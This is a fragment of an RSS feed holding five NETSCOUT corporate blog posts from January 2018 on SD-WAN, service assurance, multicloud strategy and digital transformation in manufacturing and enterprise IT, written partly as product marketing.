  <title>Why SD-WAN can create an SP network tailor-made </title>
  <link>http://localhost:7996/blog/why-sd-wan-can-create-sp-network-tailor-made</link>
  <description>While service providers have been the traditional providers of connectivity services to enterprises, they have been somewhat limited to the commodity market of providing connections. The move to virtualization and ultimately telco cloud, which is enabled by network functions virtualization (NFV) and software-defined networking (SDN), opens up the potential for them to move up...</description>
  <content:encoded><![CDATA[<p>While service providers have been the traditional providers of connectivity services to enterprises, they have been somewhat limited to the commodity market of providing connections. The move to virtualization and ultimately telco cloud, which is enabled by network functions virtualization (NFV) and software-defined networking (SDN), opens up the potential for them to move up the value chain and provide highly specific and higher value services because of the flexibility, operational cost efficiency and the rapid response capabilities of the new network.</p>

<p>Among the early use cases for virtualization are software-defined wide area networks (SD-WAN), which enable specific apps to be supported by the network in optimal ways. For example, latency-sensitive apps, such as virtual and augmented reality (VR and AR) or artificial intelligence (AI), can be served with the low latency connectivity they require to ensure the customer experience is unaffected because the network understands and has been dimensioned to support that app’s specific needs.</p>

<p>Different types of traffic can be treated in different ways but without the cost or time burden of bespoke hardware and development. The universal customer premise equipment (uCPE) or commodity white boxes that SD-WAN enables to be deployed can enable highly flexible service instantiation, accelerated service provision and greater flexibility.&nbsp;</p>

<p>A critical advantage here is that enterprises and their providers gain greater control and insight into their network traffic because of the monitoring capabilities exposed in SD-WAN environments. Performance monitoring tools with NFV and SDN capabilities provide service providers with the ability to assure and validate service level agreements (SLAs) for these new services. This is vital for service providers if they are to monetize the value they add effectively.</p>

<p>Validation and assurance are not only about generating revenue, though. Assured resilience and cost efficiency also have value to enterprises and customers alike and a further layer of value is inherent to SD-WAN because it presents a more secure environment than traditional networks thanks to its inbuilt security protocols.</p>

<p>Today SD-WAN deployment is relatively new, especially as virtualized networks add a further dimension to its potential and are only just rolling out. However, the technical familiarity with the technology that exists at many service providers means there are promising revenue cases for service providers to pursue.</p>

<p>Among the use enterprise use cases for SD-WAN is MPLS replacement, which is sometimes referred to as hybrid WAN. In essence, this enables enterprises to move to an SD-WAN solution to simplify the management of multiple networks by replacing MPLS or other private network infrastructure with IP VPNs. Importantly, as the hybrid tag suggests, enterprises can migrate at their own pace, operating hybrid networks as required.</p>

<p>Another good example is unified communications. SD-WAN provides both ease of configuration and control of network characteristics that affect the performance of unified communications services such as collaborative working. VoIP traffic, for example, can be prioritized or routed around backbone issues to assure quality for single sites as well as in multiple locations. The experience is improved and service providers, therefore, can monetize on an associated SLA.</p>

<p>Remote diagnostics is a further area in which SD-WAN has clear business benefits for enterprises. For example, if the enterprise faces an issue at a remote location, it can be difficult to guide local users through troubleshooting assistance or to ensure the correct equipment or software is available at the remote site. The built-in performance management tools in many SD-WAN solutions give the ability to assess the network state and see what the users see on the network.&nbsp;</p>

<p>The above are just some of the many examples of the potential benefits to enterprises of SD-WAN but the technology, in general terms, provides enterprises with four key advantages: resilience, cost efficiency, flexibility and enhanced security. Service providers also benefit in terms of operational and cost efficiency, improved network security and widening of their service portfolios to meet the needs of enterprises so they can win or retain as much enterprise business as possible. The new SD-WAN capabilities rely on performance monitoring tools with NFV and SDN capabilities to provide the vital insights and network data necessary to manage, instantiate and optimize the network according to the applications and traffic that pass over it and, it is these that truly unlock the potential of SD-WAN for service providers and their customers.</p>

<p><em>~Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/sd-wan-tailor-made.jpg" length="579039" type="image/jpeg"/>
    <guid isPermaLink="false">f78c2804-50c0-45c7-b7f1-c8d69a3de532</guid>
    <pubDate>Thu, 18 Jan 2018 18:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>How your service assurance strategy can improve</title>
  <link>http://localhost:7996/blog/how-your-service-assurance-strategy-can-improve</link>
  <description>If you have been to any industry conference for Service Providers or Network Operators recently, you could not have missed the buzz around SD-WAN (Software-Defined Wide-Area Networking). It has seemingly popped up out of nowhere and become all the rage. While it is relatively new in the service provider lexicon, it is actually a fairly mature technology amongst enterprise...</description>
  <content:encoded><![CDATA[<p>If you have been to any industry conference for Service Providers or Network Operators recently, you could not have missed the buzz around SD-WAN (Software-Defined Wide-Area Networking). It has seemingly popped up out of nowhere and become all the rage. While it is relatively new in the service provider lexicon, it is actually a fairly mature technology amongst enterprise customers with distributed locations.</p>

<p>SD-WAN was developed as a cost-effective alternative for site-to-site connectivity and redundancy between distributed branch offices or branch offices and a data center. Traditionally, organizations would leverage a main WAN connection with an MPLS backup. All in the interest of distributing traffic over the wide-area network while maintaining path redundancy.</p>

<p>Unfortunately, such a solution was expensive, it took a considerable amount of time to provision and install, and it lacked the flexibility and agility enterprise customers are requesting. With the rise of broadband access, a broadband connection quickly became a lower-cost, faster-to-provision method for connectivity. SD-WAN became a software overlay to the broadband connection that allowed for better network grooming, diverse routing, all at a fraction of the cost of earlier alternatives.</p>

<p>While it is attractive for enterprise customers to pursue SD-WAN, for some carriers, it is viewed skeptically as it comes at a loss of revenue from MPLS, Metro Ethernet, and other expensive options as they are decommissioned or no longer being considered. Fortunately, this story has a silver lining for service providers.</p>

<p>For service providers, operating the SD-WAN has significant advantages. First, it provides greater insight, flexibility and control over the access network. Second, it opens up new revenue opportunities. Lastly, it can and will have the ability to significantly reduce the cost of field maintenance because network operations teams will be better able to assess problems from the premises to the access to core network.</p>

<p style="text-align: center;"><img alt="undefined" height="322" src="https://images4.newscred.com/Zz04MTBhMTFiNmY0NWYzMTgzY2U4NzQ3YWQ0MDAyZTFkMw==" width="483" /></p>

<p>To understand the benefits of SD-WAN, it is important to understand a little more about SD-WAN. SD-WAN requires either a universal CPE (uCPE) device or an appliance at each branch location and a centralized broadband gateway (BGW) or SD-WAN controller. For an operator, the BGW or SD-WAN controller would reside in the network and enforce policy amongst the uCPE/appliance devices.</p>

<p>While many operators see the advantage of greater visibility and control of the WAN, it is with the premise view that operators can unlock tremendous value from the technology and their service assurance strategy. Using a uCPE, a white box platform, the operator has the ability and flexibility to instantiate virtual services on the device.</p>

<p>As part of service assurance strategy, two key virtual services would be:</p>

<p style="margin-left: 30px;"><strong>1. The ability to “see” or monitor the performance of these virtual services</strong></p>

<p style="margin-left: 30px;"><strong>2. The ability to generate synthetic transaction to send across the WAN. </strong></p>

<p>These two simple virtual functions hold a game changing capability for network operators because, for the first time, it allows the operator to remotely understand the health of the WAN (from SD-WAN) AND the health of the premise applications via probing and synthetic transactions and the ability to generate packets before the WAN and measure after the WAN for errors, throughput, etc.</p>

<p>This ability to have purview into the premise now allows a remote, network operation to diagnose problem and communicate with customer or field maintenance teams who exactly owns the problem and the exact nature of the problem. With the cost of a truck roll exceeding $100, even a nominal reduction in truck rolls can represent a significant savings to the network operator.</p>

<p>As operators pursue SD-WAN offerings, it is imperative that it be viewed in context of their service assurance strategy. By doing so, operators will be able to reap the benefits, insight, and coordination with their existing service assurance infrastructure and both increase service reliability while driving down operational costs.</p>

<p>~Written by Mike Serrano, Sr. Product Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/sd-wan-improve-strategy.jpg" length="544219" type="image/jpeg"/>
    <guid isPermaLink="false">80fba699-2325-4e1c-ba06-e1338faa650f</guid>
    <pubDate>Thu, 18 Jan 2018 18:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Digital Transformation for Manufacturing</title>
  <link>http://localhost:7996/blog/digital-transformation-manufacturing</link>
  <description>The manufacturing industry has long been committed to technology innovations that help manage demand for products around the world. With facilities in every corner of the globe, manufacturers are increasingly reliant on connectivity to ensure supply chains are operating at their peak. This is borne out in a recent study commissioned by NETSCOUT which revealed that 63% of...</description>
  <content:encoded><![CDATA[<p>The manufacturing industry has long been committed to technology innovations that help manage demand for products around the world. With facilities in every corner of the globe, manufacturers are increasingly reliant on connectivity to ensure supply chains are operating at their peak. This is borne out in a recent study commissioned by NETSCOUT which revealed that 63% of manufacturers surveyed are under greater pressure to ensure new products reach market as fast as possible.&nbsp;</p>

<p>To address challenges around complex processes and deeply integrated supply chains, more and more manufacturers are engaging in digital transformation (DX) initiatives that promise to enable them to readily adapt to changing business requirements while evolving the inter-connectivity between people, machines and products in new and exciting ways.</p>

<p>In today’s “just-in-time” manufacturing world where businesses can ill afford the slightest interruption, IT is under tremendous pressure to deliver service assurance. Simply put, network and application disruptions are too costly to be acceptable under any circumstance. This has propelled many manufacturers to examine technological advances to streamline and transform their operations.</p>

<p>Amongst the advances that DX is bringing to the manufacturing sector are improved machine-to-machine (M2M) communications, new automation technologies and wider adoption of Internet of Things (IoT) devices. By incorporating machine learning and big data technology, IoT promises to take data collected by a myriad of sensors and harness it to dramatically improve the efficiency of manufacturing processes. IoT is considered such a big deal that 82% of the aforementioned study subjects identified it as either completely essential or very important to their organization’s DX strategy.</p>

<p>Of course, with the promise of IoT comes considerable IT challenge as well. IoT has the potential to increase IT complexity, especially within highly data-driven, industrial environments. All in all, the manufacturing sector relies heavily on IT systems and services to handle everything from order processing, production line automation, shipping, supply chain logistics and accounts to CRM, CAD/CAM design and even DNS availability, which is vital for the performance of web-based apps. To assure service delivery, IT must have end-to-end visibility, providing the insights needed to pinpoint the root cause of performance degradations anywhere along the service delivery path, so they can quickly resolve any issues.</p>

<p>The push for DX has increased the need manufacturer’s face for business analytics driven by smart data. These traffic flows are literally the best source of information to glean actionable insights. NETSCOUT’s patented Adaptive Service Intelligence (ASI) technology generates smart data based on software-centric pervasive instrumentation of traffic-flows that are collected and processed at the source – from physical and virtual (SDN/NFV) infrastructure on-premises, SDDC and Hybrid Cloud environments - to produce service contextual metadata in real time. This allows IT to gain critical insights into service delivery, business operations, and other vital business performance indicators.</p>

<p>NETSCOUT’s nGeniusONE Service Assurance platform ensures the interoperability of IoT platforms, protocols, applications and services with real-time insights into device, network and cloud behavior. Their proven service triage approach gives early warning to configuration, timing and latency issues, which translates into fewer user complaints and faster problem solving.&nbsp;This in turn allows manufacturer’s to consistently maintain high levels of productivity, lower costs, reduce time to delivery and gain the operational agility to match supply with demand.</p>

<p>For a more in-depth look at how DX is impacting the manufacturing industry, download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era – Manufacturing Sector</em>, by clicking <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Manufacturing.pdf">here</a>.</p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DX_Blog_Banner_manufacturing.jpg" length="210495" type="image/jpeg"/>
    <guid isPermaLink="false">efb6a78a-d3ce-4666-b8b9-94c2e9ea73bc</guid>
    <pubDate>Wed, 17 Jan 2018 17:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Building a Best-of-Breed Multicloud Strategy</title>
  <link>http://localhost:7996/blog/building-best-breed-multicloud-strategy</link>
  <description>Best-of-breed strategies have long since fallen out of favor in the enterprise, because the work required to stitch together the components proved to be too difficult. But best of breed is back with cloud. Companies today are hell-bent on buying the ideal SaaS, PaaS, and IaaS cloud services for the job, and while APIs make the integration work easier, the resultant cloud silos...</description>
  <content:encoded><![CDATA[<p>Best-of-breed strategies have long since fallen out of favor in the enterprise, because the work required to stitch together the components proved to be too difficult. But best of breed is back with cloud. Companies today are hell-bent on buying the ideal SaaS, PaaS, and IaaS cloud services for the job, and while APIs make the integration work easier, the resultant cloud silos create a new challenge: How do you assure service performance in this multi-cloud world?</p>

<p>The short answer: By maintaining global knowledge of what is happening (and where) across&nbsp;<span>IT infrastructure, applications, and services</span>. But we’ll get back to that.</p>

<p>Companies use <a href="https://blogs.wsj.com/cio/2017/12/01/cios-must-manage-ever-expanding-range-of-cloud-services/" target="_blank">eight cloud providers on average</a>, according to IHS Markit Ltd., a research firm in London. IHS’ survey of 155 companies in a range of industries shows that number swelling to 11 within two years. When you include any and all SaaS services, the average number of cloud applications that companies use explodes to almost 1,500, <a href="https://www.skyhighnetworks.com/cloud-security-blog/12-must-know-statistics-on-cloud-usage-in-the-enterprise/" target="_blank">by some counts</a>.&nbsp;</p>

<p>While those numbers will vary, it is safe to assume that&nbsp;most companies already wrestle with multiple clouds. Consider Volkswagen. In a recent <a href="https://blogs.wsj.com/cio/2017/12/04/cio-voices-volkswagens-hofmann-explains-his-principles-of-digital-transformation/" target="_blank">Wall Street Journal interview</a>, Volkswagen CIO Martin Hofmann said the company uses public cloud services from all of the big guys—Amazon, Google, IBM, and Microsoft. “The idea is we’ve always had a policy of vendor independence. We want to be the ones picking the cloud providers, so we’re investing heavily in cloud brokerage and technology that allows us to switch instantly from one provider to another. But we’ll always keep our private cloud for sensitive data.”</p>

<p>If you include the private stack, Volkswagen has five prominent clouds.&nbsp;Hofmann didn’t even mention any SaaS tools, and it is a fair bet the company also has a hefty&nbsp;portfolio of those.</p>

<p>After all, while many companies are cloud-first now, a number put a priority on SaaS. “The construct is cloud-first; we don’t want to be in the infrastructure business,” <a href="https://www.networkworld.com/article/3177425/cloud-computing/ge-favors-saas-for-non-differentiated-apps-moves-away-from-mpls-has-big-plans-for-iot.html" target="_blank">Chris Drumgoole, GE’s Chief Technology Officer of IT, says in a recent interview.&nbsp;</a>“If you’re writing anything.&nbsp;you’re writing for the cloud, and if you’re moving anything,&nbsp;then move it to the cloud.”&nbsp;</p>

<p>But GE starts with SaaS. “The more SaaS we can buy the better off we are, especially for non-differentiated applications like HR, scheduling, administrative, bill paying, taxes, compliance, customs, etc.,” Drumgoole says. “The world can’t get to SaaS fast enough for us.”&nbsp;</p>

<p>Anecdotally speaking, cloud adoption seems to go something like this: When needs arise, enterprises first look for the best SaaS solution for the job, and, failing that, consider PaaS or IaaS options. In the worst-case scenario—or if security or compliance concerns dictate it—<span>companies&nbsp;address&nbsp;the&nbsp;need&nbsp;internally using a fungible private cloud comprised of commodity, off-the-shelf components.</span></p>

<p>The good news is, commonly available APIs make it easier to integrate these new cloud silos compared with yesterday’s best-of-breed efforts, and there are even cloud-based integration services,&nbsp;known&nbsp;as Integration Platform as a Service (IPaaS). But multi-cloud management will never be a walk in the park, so it is a safe bet that&nbsp;as the cloud ranks swell in any given organization, there will be a round of rationalization and consolidation to simplify&nbsp;the&nbsp;process.&nbsp;</p>

<p>That will be helped by the fact that prominent cloud players will keep fleshing out their offerings, and maybe the whole industry will start to contract at some point. But even this “help” translates&nbsp;to a boatload of change that&nbsp;the enterprise buyer must&nbsp; contend with as the cloud era continues to unfold.&nbsp;</p>

<p>So how do you maintain governance in this shifting and rapidly evolving multi-cloud world?&nbsp;</p>

<p>One of the most basic requirements is retaining visibility into what is going on where. Unfortunately, the tools offered by the cloud providers won’t be of much help because they are inwardly focused. Amazon CloudWatch, for example, is a tool used to monitor AWS cloud resources, providing information about virtual machine CPU utilization, memory usage, transaction volumes, etc. The tool is all about the AWS infrastructure and doesn’t give you a sense of how the application is performing, to&nbsp;say nothing of a bigger picture view about service performance across the organization’s&nbsp;combined on-premises&nbsp;and&nbsp;cloud resources.</p>

<p>Microsoft Azure has a similar tool, that also enables you to do bytecode instrumentation of the application so you can see what it is doing. But that view only takes into account the cloistered Azure world, while what is needed is a holistic <span>end-to-end&nbsp;</span>view of that performance in the real world, taking into account the application, the infrastructure, the DNS server, the AAA server, and the various network components.&nbsp;</p>

<p>Then you need that for all of your other cloud silos, too. And good luck if the performance of a given business service relies on resources from different clouds&nbsp;spanning&nbsp;disparate&nbsp;geographies. You’ll be left using multiple tools to try to piece together a big picture view.&nbsp;The&nbsp;result?&nbsp;An&nbsp;IT&nbsp;race&nbsp;across&nbsp;disciplines<span>&nbsp;to&nbsp;establish&nbsp;mean time to innocence&nbsp;while service performance degrades&nbsp;and users don’t get what they expect.</span></p>

<p>Instead, the nirvana vision is to have a single way to gauge the health and performance of service levels across these various environments. You need to be able to instrument any cloud environment, all virtual and physical resources (in the data center and out in the branches), define the service dependencies, and <span>efficiently monitor&nbsp;</span>and correlate traffic flows between all the piece parts. That will make it possible to achieve a holistic view that enables you to proactively identify service degradation, triage problems, and quickly get to the root of service issues.</p>

<p>The reality is that the cloud world is only going to get more complex.&nbsp; First, there's the <span>growth&nbsp;</span>of microservices, a development architecture that simplifies scalability by breaking applications down into independent but linked modular services. While that may be a great step forward for development, it will further complicate matters when the operations side of the house needs to find the cause of a service degradation or outage. Meanwhile, technologies like IoT and machine learning pour a tsunami of data across complex cloud environments, powering digital transformation, but also ratcheting up complexity. As the pressure grows, it's clear that&nbsp;the time to grab the bull by the horns is now.</p>

<p><em>~Written by John Dix.&nbsp; John is&nbsp;an IT industry veteran who has been chronicling the major shifts in IT since the emergence of distributed processing in the early ‘80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz0zYTQ5NjUxNGUyZDMwNmQ4ZGFlMTBhMmVlYWQxMDZkOA.jpg" length="615465" type="image/jpeg"/>
    <guid isPermaLink="false">657a7a2d-fe2e-4726-8159-8914ce39051b</guid>
    <pubDate>Mon, 08 Jan 2018 13:52:15 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>The Digital Transformation Train Has Left the Station</title>
  <link>http://localhost:7996/blog/digital-transformation-train-has-left-station</link>
  <description>If your organization isn’t already knee deep into digital transformation (DX) by now, then you’re the exception and not the rule. A recent study commissioned by NETSCOUT revealed that nearly eight in ten (79%) IT and business decision makers who were surveyed in the U.S., UK, Germany, and France believe that DX is an urgent requirement for their organization. Clearly, the DX...</description>
  <content:encoded><![CDATA[<p>If your organization isn’t already knee deep into digital transformation (DX) by now, then you’re the exception and not the rule. A recent study commissioned by NETSCOUT revealed that nearly eight in ten (79%) IT and business decision makers who were surveyed in the U.S., UK, Germany, and France believe that DX is an urgent requirement for their organization. Clearly, the DX train has left the station.</p>

<p>This trend is borne out by the large investments being made in DX. For enterprises that are either fully or partially focused on at least one DX area, respondents agreed IT budget spend is increasing. The survey showed DX expenditures on average are expected to increase from 29% in 2017 to 34% in 2020. And 41% of these organizations indicated they will need to invest more to ensure that DX is a success.</p>

<p>No industry is immune from the rapid changes that are taking place in today’s digital economy. The pressure to adapt to rapidly changing market conditions and demands has spawned a plethora of ‘cloud-first’ start-ups that are unencumbered by legacy systems and conventions. These organizations are adopting new business models that rely on speed and flexibility. This should stand as something of a wakeup call for the rest of the business world, who are starting to see the benefits of tossing aside a more traditional mind-set and instead embracing new digital approaches to customer engagement and business growth.</p>

<p>With businesses facing greater and greater levels of interconnectivity and service inter-dependencies, DX is enabling enterprises to leverage information as never before, allowing them to gain insight into service delivery, operations and business performance. As a result, we’re seeing a strong push toward more agile, automated operational environments that rely on continuous monitoring and real-time analysis of the network. Using smart data and superior analytics, business are becoming empowered to innovate and take advantage of emerging opportunities.</p>

<p>Forward-thinking organizations that have adopted a digital mind-set have come to recognize that the new paradigm of business decisions must be built on speed and business insights achieved through big data-driven visibility across physical, virtual and hybrid environments. Such companies are leveraging all their data sources, including network and application traffic, to achieve competitive advantages.</p>

<p>A key enabler of DX success is business assurance. NETSCOUT offers robust business assurance through a combination of service assurance, cybersecurity, and business intelligence solutions that provide unmatched visibility into the applications and services that drive DX. This allows organizations to gain invaluable insights into service performance and security issues across all of their applications, compute, network, and storage workloads – whether on-premises or in hybrid cloud environments. The net result is, IT organizations are able to ensure high levels of availability, reliability, and responsiveness of digital services. And that is sure to keep your DX train on the right track and accelerating toward the future.</p>

<p>For a deeper dive into the latest trends in DX and how enterprises can prepare for the future, download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era</em>, by clicking <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Assuring_Enterprise_Digital_Era.pdf">here</a>.</p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DXSeries1.jpg" length="135936" type="image/jpeg"/>
    <guid isPermaLink="false">a586ce58-adda-42be-b538-d208a7562ef1</guid>
    <pubDate>Mon, 01 Jan 2018 18:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>

  </channel>
</rss>
